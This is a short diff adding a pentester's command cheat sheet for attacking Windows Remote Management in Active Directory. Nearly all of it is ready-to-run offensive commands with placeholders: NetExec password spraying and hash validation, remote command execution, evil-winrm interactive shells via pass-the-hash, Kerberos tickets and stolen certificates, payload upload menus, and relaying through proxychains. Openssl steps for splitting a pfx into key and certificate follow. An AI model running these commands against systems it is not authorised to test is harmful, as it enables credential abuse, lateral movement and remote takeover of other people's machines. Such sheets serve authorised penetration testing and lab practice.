@@ -1,0 +1,55 @@
+% winrm, ad, shell
+
+; --- NetExec winrm (check / spray / run) ---
+# Service + null/guest auth check
+nxc winrm <ip>
+
+# Validate password
+nxc winrm <ip> -u <user> -p <pass>
+
+# Validate NT hash
+nxc winrm <ip> -u <user> -H <nthash>
+
+# Spray users x passwords (continue on success)
+nxc winrm <ip> -u users.txt -p passwords.txt --continue-on-success
+
+# Kerberos ccache auth
+nxc winrm <ip> -u <user> --use-kcache
+
+# Run a one-off command on success
+nxc winrm <ip> -u <user> -p <pass> -x 'whoami /priv'
+
+# Run PowerShell on success
+nxc winrm <ip> -u <user> -p <pass> -X "Get-Process | Out-String"
+
+; --- evil-winrm interactive shell ---
+# Password auth
+evil-winrm -i <ip> -u <user> -p <pass>
+
+# Pass-the-hash
+evil-winrm -i <ip> -u <user> -H <nthash>
+
+# Kerberos (set KRB5CCNAME first; connect by FQDN)
+evil-winrm -i dc.<domain> -r <domain>
+
+# Certificate (pubkey) auth over SSL
+evil-winrm -i <ip> -c <user>.crt -k <user>.key -S
+
+# SSL / 5986
+evil-winrm -i <ip> -u <user> -p <pass> -S
+
+# Script/exe upload menus (-s scripts/ -e exes/)
+evil-winrm -i <ip> -u <user> -p <pass> -s <scriptdir> -e <exedir>
+
+# Session logging (transcript on attacker side)
+evil-winrm -i <ip> -u <user> -p <pass> -l
+
+# Route through SOCKS5 (pair with ntlmrelayx -socks)
+proxychains -q evil-winrm -i <ip> -u <user> -p <pass>
+
+; --- pfx helpers (split a pfx into key + crt) ---
+# Extract the private key
+openssl pkcs12 -in <user>.pfx -nocerts -out <user>.key -nodes
+
+# Extract the certificate
+openssl pkcs12 -in <user>.pfx -clcerts -nokeys -out <user>.crt
